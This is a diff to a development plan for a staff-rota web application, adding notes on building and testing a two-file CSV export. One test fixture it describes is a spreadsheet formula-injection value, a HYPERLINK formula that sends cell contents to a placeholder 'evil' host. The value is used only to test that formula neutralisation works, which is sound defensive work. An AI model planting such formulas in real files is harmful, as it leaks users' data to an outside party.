@@ -1394,6 +1394,98 @@ cases were watched red first against the un-implemented screen.
 cell of `/admin/rota` and `master-rota.spec.js` locates its row by `hasText`; nothing collided.
 `npm run build` green.
 
+**Task 10 (2026-08-10) — the export is a support class, not two controller methods, and the reason
+is Task 11 rather than tidiness.** The task's "Files touched" lists only
+`MasterRotaController.php`. What shipped is `app/Support/Rota/RotaExport.php` holding
+`ASSIGNMENT_HEADERS`/`VACATION_HEADERS` and the two row builders, with the controller reduced to
+one private `export()` that both routes call. Three reasons, in order of weight: (1) the importer
+matches those header names case-insensitively (Decision H point 1), so the export and the import
+need ONE definition of the column list or they drift silently — a header renamed on the writing
+side and not the reading side produces a file that imports as "missing required header"; (2) every
+other rota computation in this codebase lives in `App\Support\Rota` (`RotaGrid`, `RotaFill`,
+`AvailabilitySummary`), so a hundred lines of query-and-row-building in a controller would be the
+one exception; (3) `peopleWithoutAShortName()` is a pure fold that belongs beside the thing it
+warns about.
+
+**Task 10 (2026-08-10) — the rows are an ARRAY, not the lazy generator the task text asks for, and
+the audit row is why.** *"`Csv::stream()` takes an iterable, so build rows lazily"* cannot be
+reconciled with test 6: a `StreamedResponse` does not run its callback until after the controller
+has returned, so a generator's row count is unknown at the moment `rota_export` is written. The
+alternatives were a second `COUNT(*)` — which can disagree with the file it claims to describe —
+or an audit row with no count, which is the one number the task specifies. A year's spans are
+bounded (sixty people x thirteen periods x a span or two), so the array is affordable and the count
+is the file's own.
+
+**Task 10 (2026-08-10) — THE STALE-PERSON DECISION: they are IN the file.** Decision D hides a
+departed person from the resident read view; this export deliberately does not. Their spans are
+exactly what blocks `PeriodController::destroy()`, so an administrator exporting the year to find
+out why it will not clear must see them — and the export sits behind `rota.manage`, the same
+capability as the EDITOR grid, which shows them for that same reason. Task 11 copes by answering
+such a row `SKIP_UNKNOWN_PERSON` with *"no longer on the active roster"* (Decision H point 3): the
+information is named on the way back in, never silently dropped on the way out. Both queries eager-
+load the person `withTrashed()`; proved necessary by removing it and watching
+`test_a_stale_person_who_still_holds_a_span_is_in_the_file` go red on the soft-deleted half —
+without it SoftDeletes' global scope nulls the relation rather than omitting the row, so the file
+would have carried the span with two BLANK name columns and no error anywhere.
+
+**Task 10 (2026-08-10) — the short-name warning counts people who would APPEAR IN THE FILE, not
+everybody in the year.** Decision G says the screen "names how many people in the year lack a short
+name". Counted literally over a `RotaGrid` row set that also includes every active person with
+nothing planned, the number does not match the number of broken lines in the file it is warning
+about — and a warning that fires on somebody who exports no rows at all is one an administrator
+learns to ignore. `RotaExport::peopleWithoutAShortName()` therefore requires at least one span or
+one vacation in the year. The export still RUNS with the blank handle, per the task text: dropping
+the person would lose rows from a file whose whole job is to describe what the rota holds.
+
+**Task 10 (2026-08-10) — a `?year=` with no periods is a 404, which the task text does not
+specify.** The alternative — a header-only file — makes a typo indistinguishable from a year whose
+rota was cleared, the same argument Task 7's amendment settled for a fill preview that silently
+renders "0 cells". `test_an_unknown_year_is_a_404` was the ONE case in this file green on its first
+run, and vacuously: before the routes existed every URL in it answered 404. It now asserts the
+known year is a 200 first, so deleting the routes fails it — the same non-vacuity fix Task 3's
+amendment records for the router assertion.
+
+**Task 10 (2026-08-10) — `ContactFieldsAreProjectedOnceTest` fired on this task's own DOCBLOCK.**
+`RotaExport`'s class comment explained that a future hand-built row carrying the phone attribute
+would fail the byte-level assertion — and quoted the arrow-and-field accessor form to say so. That
+guard's needle list is a plain substring scan with no allow-list, so the sentence describing the
+defect WAS the defect as far as the scan could tell: *"app/Support/Rota/RotaExport.php contains
+->phone"*, on an otherwise-green full run. This is finding 14's trap (docblock prose matching a
+needle) in the PHP contact scan rather than the client's date scan, and finding 14 only warns about
+the latter. Rewritten around the accessor shape; the guard was not touched.
+
+**Task 10 (2026-08-10) — every claim was proved falsifiable by planting its defect, and all five
+probes were reverted.** (1) The unit eager-load constrained to `active()` — i.e. reading codes the
+way `RotaGrid` does — → `test_a_retired_units_span_keeps_its_code` red with *"expected 'XCU', got
+''"*, which is the whole reason this class exists rather than a fold over the grid. (2) `withTrashed()`
+dropped, above. (3) An `email` column planted in `ASSIGNMENT_HEADERS` and its row → BOTH
+`test_the_export_carries_no_contact_column` and `test_a_person_is_identified_by_short_name_and_full_name`
+red, the first printing the leaked address in its own failure message. (4) Both export buttons
+pointed at the same file → the href case red (a screen offering two buttons to one file looks
+entirely correct otherwise). (5) The short-name warning's `v-if` forced false → the count case red.
+
+**Task 10 (2026-08-10) — the round trip is asserted at the FEATURE level, through
+`CsvRosterReader`, and it is what every content assertion in the file goes through.** Test 4 in the
+task text asserts the leading apostrophe in the raw bytes; that alone proves neutralisation but not
+the PAIRING, which is what `CsvInjectionTest` exists to assert at the primitive and what makes
+export → re-import lossless. `test_the_export_round_trips_through_the_reader_unchanged` writes the
+streamed bytes to a temp file, reads them back with the reader Task 11 will use, and asserts a
+formula-injection name (`=HYPERLINK("http://evil/?"&A1)`) and an Arabic name (`محمد العتيبي`) come
+back byte-identical from BOTH files. A short name beginning `=` is in the same fixture, so the
+handle the importer matches on is proved to survive the trip too.
+
+**Task 10 (2026-08-10) — `rota_export` is deliberately NOT on `AuditAnomalies`' watch list.** That
+list fires once per matching row in the window (finding 13), and an export is a routine
+administrative act; adding it would train an operator to ignore the channel that exists for
+`rota_fill`. The audit row is still written on every export, ids and counts only — and
+`test_a_resident_cannot_export` asserts a REFUSED export writes none.
+
+**Task 10 (2026-08-10) — counts.** `php artisan test` 1228 → **1241** (thirteen in the new
+`RotaExportTest`). `npm test` 168 → **173** (five in the new `tests/js/MasterRotaExport.test.js`;
+the plan lists no Vitest file for this task, but a prop nothing renders is exactly the defect
+Task 9's amendment records — the PHP side proves the count, only a mount proves an operator sees
+it). `npm run test:e2e` **21** unchanged, re-measured. `npm run build` green.
+
 ---
 
 ## Standing rules for every task
@@ -2515,9 +2607,12 @@ git commit -am "docs: what reading, summarising and moving the rota changed"
 - [ ] **One** `rota_fill` audit row per operation, ids and counts only, written after the
       transaction commits. `rota_fill` is on `AuditAnomalies`' watch list; the five per-cell rota
       actions are not, and a test asserts both halves.
-- [ ] Export is **two** files, through `App\Support\Csv` only, BOM-first, formula-neutralised, with
-      **no email and no phone** — asserted with `contact_visibility = members`.
-- [ ] A person with no `short_name` is reported before the file is generated.
+- [x] Export is **two** files, through `App\Support\Csv` only, BOM-first, formula-neutralised, with
+      **no email and no phone** — asserted with `contact_visibility = members`. (Task 10. The
+      contact assertion is over the file's BYTES, and the neutralisation is asserted as a ROUND
+      TRIP through `CsvRosterReader` — a formula name and an Arabic name both come back identical.)
+- [x] A person with no `short_name` is reported before the file is generated. (Task 10. Counted
+      over the people who would appear in the file, not the whole roster — see Amendments.)
 - [ ] `RotaImport::preview()`/`commit()` share one `analyse()`; the whole file is validated before
       any write; the commit is pinned to the previewed digest; outcomes are `CREATE`/`REPLACE`/
       `SKIP_UNKNOWN_PERSON`/`SKIP_UNKNOWN_UNIT`/`SKIP_UNKNOWN_PERIOD`/`ERROR`, plus
